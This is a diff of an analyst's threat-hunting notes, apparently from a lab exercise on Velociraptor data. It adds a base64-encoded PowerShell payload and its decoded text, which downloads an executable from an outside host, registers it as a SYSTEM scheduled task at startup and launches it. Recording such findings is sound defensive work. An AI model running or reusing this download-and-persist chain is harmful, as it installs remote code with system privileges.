@@ -92,11 +92,18 @@ schetasks.exe 1005
 ![[Pasted image 20250828134626.png]]
 
 
-using zeek im trying to find out Which process pair stands out as unusual and why? using the index and source provided. index="velociraptor" source=*
 
+Base 64 Malicious
 
+```
+SW52b2tlLVdlYlJlcXVlc3QgLVVyaSAiaHR0cHM6Ly9jZG4tZmlsZXMtYXJjaGl2ZS5jb20vYmluL1VwZGF0ZXJUYXNrLmV4ZSIgLU91dEZpbGUgIkM6XFVzZXJzXHN2Yy11cGRhdGVyXEFwcERhdGFcUm9hbWluZ1xVcGRhdGVyVGFzay5leGUiDQpzY2h0YXNrcyAvY3JlYXRlIC90biAiVXBkYXRlclRhc2siIC90ciAiQzpcVXNlcnNcc3ZjLXVwZGF0ZXJcQXBwRGF0YVxSb2FtaW5nXFVwZGF0ZXJUYXNrLmV4ZSIgL3NjIG9uc3RhcnQgL3J1IFNZU1RFTQ0KU3RhcnQtUHJvY2VzcyAiQzpcVXNlcnNcc3ZjLXVwZGF0ZXJcQXBwRGF0YVxSb2FtaW5nXFVwZGF0ZXJUYXNrLmV4ZSINCg
+```
 
-
+```
+Invoke-WebRequest -Uri "https://cdn-files-archive.com/bin/UpdaterTask.exe" -OutFile "C:\Users\svc-updater\AppData\Roaming\UpdaterTask.exe"
+schtasks /create /tn "UpdaterTask" /tr "C:\Users\svc-updater\AppData\Roaming\UpdaterTask.exe" /sc onstart /ru SYSTEM
+Start-Process "C:\Users\svc-updater\AppData\Roaming\UpdaterTask.exe"
+```
 
 
 
